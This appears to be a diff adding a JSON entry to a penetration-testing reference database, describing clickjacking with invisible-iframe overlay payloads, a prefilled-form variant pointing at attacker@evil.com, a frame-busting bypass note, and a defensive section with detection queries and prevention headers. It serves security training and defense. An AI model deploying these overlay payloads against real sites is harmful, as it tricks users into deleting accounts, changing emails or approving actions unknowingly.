@@ -1,0 +1,104 @@
+{
+  "id": "web-clickjacking",
+  "name": "Clickjacking (Frame-Based UI Redress)",
+  "command": "<iframe src=\"https://<target>/account\" style=\"opacity:0.0001;position:absolute;top:0;left:0\"></iframe>",
+  "description": "UI-redress attack that frames a target application inside an invisible/transparent iframe over decoy content, so the victim's clicks land on sensitive controls (delete account, change email, approve OAuth, transfer funds) they cannot see. Exploits missing X-Frame-Options / CSP frame-ancestors. Covers the opacity-overlay PoC, drag-and-drop and prefilled-form variants, and chaining a framed action with a prefilled input.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web",
+  "subcategory": "Client-Side",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "PortSwigger Web Security Academy - Clickjacking",
+  "tags": [
+    "clickjacking",
+    "ui-redress",
+    "x-frame-options",
+    "frame-ancestors",
+    "csp"
+  ],
+  "mitre": [
+    "T1185"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY IT WORKS ===\n  If a page can be framed (no X-Frame-Options / no CSP frame-ancestors), an attacker overlays it transparently on top of bait content and aligns a decoy button under a real sensitive control. The victim 'clicks the bait' but actually clicks the framed app while authenticated.\n\n=== BASIC OPACITY-OVERLAY PoC ===\n  <style>\n    iframe { position:absolute; top:0; left:0; width:1000px; height:700px; opacity:0.0001; z-index:2; }\n    #decoy { position:absolute; z-index:1; }\n  </style>\n  <div id=\"decoy\"><button style=\"position:absolute;top:310px;left:60px\">Claim prize</button></div>\n  <iframe src=\"https://<target>/account/delete\"></iframe>\n  Align the decoy button under the real 'Confirm' button (tweak top/left; set opacity to 0.5 while aligning, then to ~0).\n\n=== PREFILLED-FORM VARIANT ===\n  - Load the framed app with a URL that prefills a form (e.g. /email/change?email=attacker@evil.com) so a single framed click submits attacker data.\n\n=== DRAG-AND-DROP / MULTISTEP ===\n  - Trick the user into dragging a token into a field, or chain two aligned clicks.\n\n=== BYPASS NOTES ===\n  - frame-busting JS alone is weak; test if the site relies only on JS (sandbox the iframe to neuter busting: <iframe sandbox=\"allow-forms allow-scripts\">, but note sandbox also blocks top-nav).\n\n=== TOOLING ===\n  - Burp 'Clickbandit' (Burp > top menu > Burp > Clickbandit) records a working PoC automatically.",
+  "examples": [
+    {
+      "label": "Minimal transparent-overlay PoC",
+      "command": "<iframe src=\"https://<target>/account\" style=\"opacity:0.0001;position:absolute;top:0;left:0;width:1000;height:700\"></iframe>"
+    },
+    {
+      "label": "Prefilled form so one click submits attacker data",
+      "command": "<iframe src=\"https://<target>/email/change?email=attacker@evil.com\"></iframe>"
+    },
+    {
+      "label": "Check framing protection headers",
+      "command": "curl -sI https://<target>/account | grep -iE 'x-frame-options|content-security-policy'"
+    }
+  ],
+  "references": [
+    {
+      "title": "PortSwigger - Clickjacking (UI redressing)",
+      "url": "https://portswigger.net/web-security/clickjacking"
+    },
+    {
+      "title": "OWASP - Clickjacking",
+      "url": "https://owasp.org/www-community/attacks/Clickjacking"
+    },
+    {
+      "title": "MDN - CSP frame-ancestors",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "xss-phishing-form",
+      "note": "Both coerce victim interaction - phishing form vs invisible frame.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cors-misconfiguration",
+      "note": "Another client-side trust-boundary flaw to test on the same app.",
+      "rel": "alternative"
+    },
+    {
+      "id": "web-postmessage-exploitation",
+      "note": "framed pages often also expose postMessage origin flaws.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Without X-Frame-Options or a CSP frame-ancestors directive, the browser lets any site embed the app in an iframe. An attacker renders it transparently over decoy content so authenticated clicks are redirected to sensitive controls.",
+    "prerequisites": "A sensitive, state-changing page that can be framed (no anti-framing header) and a victim who is authenticated and interacts with the attacker's bait page.",
+    "impact": "Unintended sensitive actions performed as the victim - account deletion, email/password change, OAuth consent, fund transfer, or privilege changes - without stealing credentials.",
+    "detection": "[MITRE T1185] Largely a client-side attack with limited server telemetry; look for sensitive-action requests whose Referer/Sec-Fetch-Dest indicate an iframe/cross-site origin, and for responses that are being served without framing-protection headers.",
+    "artifacts": "Web access logs with Referer and Sec-Fetch-Dest=iframe / Sec-Fetch-Site=cross-site on sensitive endpoints, and header-audit reports showing missing X-Frame-Options / frame-ancestors.",
+    "splunk_spl": "index=web (uri_path=\"/account/delete\" OR uri_path=\"/email/change\")\n| rex field=_raw \"Sec-Fetch-Dest:\\s*(?<dest>\\S+)\"\n| rex field=_raw \"Sec-Fetch-Site:\\s*(?<site>\\S+)\"\n| where dest=\"iframe\" OR site=\"cross-site\"\n| stats count by clientip, uri_path, site",
+    "elastic_kql": "url.path:(\"/account/delete\" or \"/email/change\") and http.request.headers.sec-fetch-dest:\"iframe\"",
+    "sentinel_kql": "W3CIISLog\n| where csUriStem in (\"/account/delete\",\"/email/change\")\n| extend secFetchSite = extract(@\"Sec-Fetch-Site:\\s*(\\S+)\", 1, csHeaders)\n| where secFetchSite == \"cross-site\"\n| summarize count() by cIP, csUriStem",
+    "sigma_rules": "web_clickjacking_cross_site_iframe_action",
+    "prevention": "Send Content-Security-Policy: frame-ancestors 'self' (or an explicit allow-list) on all pages, plus X-Frame-Options: DENY/SAMEORIGIN for legacy browsers. Require re-authentication or an un-prefillable confirmation step for destructive actions. Set SameSite cookies. Do not rely on JavaScript frame-busting alone.",
+    "sources": [
+      "https://portswigger.net/web-security/clickjacking",
+      "https://owasp.org/www-community/attacks/Clickjacking"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "Sensitive action requested from a cross-site iframe context",
+        "logic": "index=web sourcetype=nginx (uri_path=\"/account/delete\" OR uri_path=\"/email/change\")\n| rex field=_raw \"Sec-Fetch-Dest:\\s*(?<dest>\\S+)\"\n| rex field=_raw \"Sec-Fetch-Site:\\s*(?<site>\\S+)\"\n| where dest=\"iframe\" OR site=\"cross-site\"\n| stats count by clientip, uri_path, site",
+        "data_source": "nginx",
+        "attack": [
+          "T1185"
+        ],
+        "fidelity": "telemetry",
+        "confidence": "low",
+        "false_positives": "Legitimate embedded widgets or same-org iframes; older browsers omit Sec-Fetch-* headers.",
+        "tuning": "Combine with the absence of framing-protection headers on the response and focus on destructive endpoints only."
+      }
+    ]
+  }
+}
